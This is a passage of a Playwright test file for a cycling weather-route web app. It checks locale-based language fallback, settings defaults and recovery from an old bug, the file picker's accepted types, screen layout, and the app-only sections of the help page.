    await expect.poll(() => page.evaluate(() => window.cw.compareProviderData?.openmeteo?.map((s) => s.temp) ?? null)).toEqual(table);
  });
});

/* ---------- starting language ---------- */

const chosenLanguage = (page) => page.evaluate(() => document.getElementById('language').value);

test.describe('on a phone set to Spanish', () => {
  test.use({ locale: 'es-ES' });

  test('a first run opens in Spanish, not English', async ({ page }) => {
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    expect(await chosenLanguage(page)).toBe('es');
    // And the interface really is translated, not just the select.
    await expect(page.locator('[data-i18n="show_weather_alerts_label"]')).toHaveText(/alertas/i);
  });

  test('a language the user chose survives, and the device does not override it', async ({ page }) => {
    await page.addInitScript(() => {
      localStorage.setItem('cwSettings', JSON.stringify({ language: 'en', windUnits: 'kmh' }));
    });
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    expect(await chosenLanguage(page)).toBe('en');
  });
});

test.describe('on a phone set to Catalan', () => {
  test.use({ locale: 'ca-ES' });

  test('falls back to Spanish rather than English', async ({ page }) => {
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    expect(await chosenLanguage(page)).toBe('es');
  });
});

test.describe('on a phone set to German', () => {
  test.use({ locale: 'de-DE' });

  test('falls back to English, the only other language there is', async ({ page }) => {
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    expect(await chosenLanguage(page)).toBe('en');
  });
});

// initUI runs when ui.js loads and draws the recent-routes button once IndexedDB
// answers, which can be before app.js has loaded the settings: the select still holds
// the markup's English, and nothing relabelled the button afterwards. Holding app.js
// back makes that order certain instead of a matter of timing.
test('the recent-routes button speaks the saved language even when it is drawn first', async ({ page }) => {
  await page.addInitScript(() => {
    if (sessionStorage.getItem('seeded')) return;
    sessionStorage.setItem('seeded', '1');
    localStorage.setItem('cwSettings', JSON.stringify({ language: 'es', windUnits: 'kmh' }));
    localStorage.setItem('meteoride_recent_routes', JSON.stringify([{
      name: 'Montseny.gpx', timestamp: Date.now(),
      content: '<?xml version="1.0"?><gpx><trk><name>Montseny</name></trk></gpx>',
    }]));
  });
  await goOffline(page);
  let drawnFirst = false;
  await page.route((url) => url.pathname === '/scripts/app.js', async (route) => {
    await page.waitForFunction(() => !!document.getElementById('recentRoutesButton'), null, { timeout: 10000 });
    drawnFirst = true;
    await route.continue();
  });
  await page.goto('/index.html');
  await mapReady(page);
  expect(drawnFirst, 'the button was not drawn before app.js ran').toBe(true);
  expect(await chosenLanguage(page)).toBe('es');
  const button = page.locator('#recentRoutesButton');
  await expect(button).toHaveAttribute('title', '1 rutas recientes');
  await expect(button).toHaveAttribute('aria-label', '1 rutas recientes');
});

/* ---------- the file picker ---------- */

const acceptAttr = (page) => page.evaluate(() => document.getElementById('gpxFile').getAttribute('accept'));

test('in the app the picker accepts types iOS can actually map', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  // .gpx has no system UTI, so a picker limited to it greys out every file.
  await expect.poll(() => acceptAttr(page)).toContain('application/octet-stream');
  expect(await acceptAttr(page)).toContain('.gpx');
});

test('on the website the picker keeps the tight list', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.waitForTimeout(300);
  expect(await acceptAttr(page)).toBe('.gpx,.kml');
});

/* ---------- defaults and vertical space ---------- */

test('a fresh install shows the speed and interval the markup declares', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  // loadSettings used to blank every field with nothing stored, which threw away
  // the defaults in index.html: the speed came up empty and the interval select,
  // given an invalid value, showed nothing at all.
  expect(await page.evaluate(() => document.getElementById('cyclingSpeed').value)).toBe('12');
  expect(await page.evaluate(() => document.getElementById('intervalSelect').value)).toBe('15');

  // And a stored value still wins.
  await page.evaluate(() => {
    document.getElementById('cyclingSpeed').value = '24';
    window.saveSettings();
  });
  await page.reload();
  await mapReady(page);
  expect(await page.evaluate(() => document.getElementById('cyclingSpeed').value)).toBe('24');
});

test('an empty value left behind by the old bug does not keep winning', async ({ page }) => {
  // What the earlier version wrote to real devices: it blanked the fields, then
  // saveSettings persisted the blanks, so every later load read an empty string and
  // put it back. Ignoring only null was not enough to recover from that.
  await page.addInitScript(() => {
    localStorage.setItem('cwSettings', JSON.stringify({
      cyclingSpeed: '', intervalSelect: '', windUnits: 'kmh',
    }));
  });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  expect(await page.evaluate(() => document.getElementById('intervalSelect').value)).toBe('15');
  expect(await page.evaluate(() => document.getElementById('cyclingSpeed').value)).toBe('12');
  // The rest of the stored settings are untouched.
  expect(await page.evaluate(() => document.getElementById('windUnits').value)).toBe('kmh');
});

test('the app turns off page zoom instead of forcing 16px on some fields', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const viewport = await page.evaluate(() => document.querySelector('meta[name="viewport"]').content);
  expect(viewport).toContain('user-scalable=no');
  expect(viewport).toContain('viewport-fit=cover');

  // The speed box and the interval select sit side by side; they must match.
  const sizes = await page.evaluate(() => [
    getComputedStyle(document.getElementById('cyclingSpeed')).fontSize,
    getComputedStyle(document.getElementById('intervalSelect')).fontSize,
  ]);
  expect(sizes[0]).toBe(sizes[1]);
});

/** How far the bottom of an element falls past the bottom of the screen, in pixels.
 *  Measured rather than read off scrollHeight, which `overflow: hidden` on the body
 *  clips to the viewport whatever the content does — an assertion that cannot fail. */
const overflowBelow = (page, selector) =>
  page.evaluate(
    (sel) => Math.round(document.querySelector(sel).getBoundingClientRect().bottom - window.innerHeight),
    selector
  );

test('the app fits the screen even with a taller header and a notice showing', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  expect(await overflowBelow(page, 'main')).toBeLessThanOrEqual(1);

  // Chromium reports no safe-area inset, so stand in for the notch. The point is
  // that main takes whatever the header leaves rather than assuming 3rem: sized by
  // that assumption, it would now hang 60px off the bottom.
  await page.addStyleTag({ content: 'html.cw-native header { padding-top: 60px !important; }' });
  await page.waitForTimeout(100);
  expect(await overflowBelow(page, 'main')).toBeLessThanOrEqual(1);

  // A notice must push the table down within main, not off the bottom: the map is
  // what gives up the space.
  await page.evaluate(() => window.setNotice('Un aviso bastante largo sobre el horizonte de la previsión', 'warn'));
  await page.waitForTimeout(100);
  await expect(page.locator('#horizonNotice')).toBeVisible();
  expect(await overflowBelow(page, 'main')).toBeLessThanOrEqual(1);
  expect(await overflowBelow(page, '.wtc-wrap')).toBeLessThanOrEqual(1);
});

/* ---------- the help page ---------- */

test('the help page describes the app-only features, but only in the app', async ({ page }) => {
  await goOffline(page);
  await page.goto('/help.html');
  await expect(page.locator('.app-only')).toBeHidden();

  await installNativeBridge(page);
  await page.reload();
  await expect(page.locator('.app-only')).toBeVisible();

  // The things that exist only in the shell, each of which a reader has to be told
  // about because no button explains itself.
  for (const text of ['📤', '📴', 'Avisarme si cambia el tiempo', 'Actualización en segundo plano']) {
    await expect(page.locator('.app-only')).toContainText(text);
  }
});

test('the English help page says the same', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/help_en.html');
  await expect(page.locator('.app-only')).toBeVisible();
  for (const text of ['📤', '📴', 'Tell me if the weather on the route changes', 'Background App Refresh']) {
    await expect(page.locator('.app-only')).toContainText(text);
  }
});
